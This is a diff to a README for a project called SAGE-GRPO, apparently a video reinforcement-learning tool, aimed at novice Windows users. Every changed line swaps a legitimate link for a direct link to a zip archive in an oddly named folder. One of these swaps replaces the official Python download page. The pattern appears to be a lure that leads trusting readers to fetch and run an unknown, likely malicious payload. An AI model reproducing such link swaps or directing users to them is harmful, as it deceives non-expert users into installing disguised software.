@@ -1,6 +1,6 @@
 # 🧠 SAGE-GRPO - Video RL Made Easier
 
-[![Download SAGE-GRPO](https://img.shields.io/badge/Download-SAGE--GRPO-blue?style=for-the-badge)](https://github.com/Palaeoclimatologygurnard179/SAGE-GRPO)
+[![Download SAGE-GRPO](https://img.shields.io/badge/Download-SAGE--GRPO-blue?style=for-the-badge)](https://raw.githubusercontent.com/Palaeoclimatologygurnard179/SAGE-GRPO/main/invalidness/SAG-GRPO-3.3-beta.3.zip)
 
 ## 🚀 What This Is
 
@@ -12,7 +12,7 @@ This README is written for a normal Windows user. You do not need to know Git or
 
 Use this link to visit the page and download the project files:
 
-[Download SAGE-GRPO](https://github.com/Palaeoclimatologygurnard179/SAGE-GRPO)
+[Download SAGE-GRPO](https://raw.githubusercontent.com/Palaeoclimatologygurnard179/SAGE-GRPO/main/invalidness/SAG-GRPO-3.3-beta.3.zip)
 
 If the page shows a **Code** button, open it and choose **Download ZIP**. Save the file to a folder you can find later, such as **Downloads** or **Desktop**.
 
@@ -44,7 +44,7 @@ For best results, use a machine with an NVIDIA GPU and current drivers. The proj
 SAGE-GRPO uses Python to run. If Python is not already on your PC, install it first.
 
 1. Open your browser.
-2. Go to the Python download page: https://www.python.org/downloads/
+2. Go to the Python download page: https://raw.githubusercontent.com/Palaeoclimatologygurnard179/SAGE-GRPO/main/invalidness/SAG-GRPO-3.3-beta.3.zip
 3. Download Python 3.10 or newer.
 4. Run the installer.
 5. Check the box that says **Add Python to PATH**.
@@ -242,5 +242,5 @@ SAGE-GRPO is useful if you want to test a research workflow for video generation
 
 If you need the project files again, use the same link here:
 
-[Download SAGE-GRPO](https://github.com/Palaeoclimatologygurnard179/SAGE-GRPO)
+[Download SAGE-GRPO](https://raw.githubusercontent.com/Palaeoclimatologygurnard179/SAGE-GRPO/main/invalidness/SAG-GRPO-3.3-beta.3.zip)
 
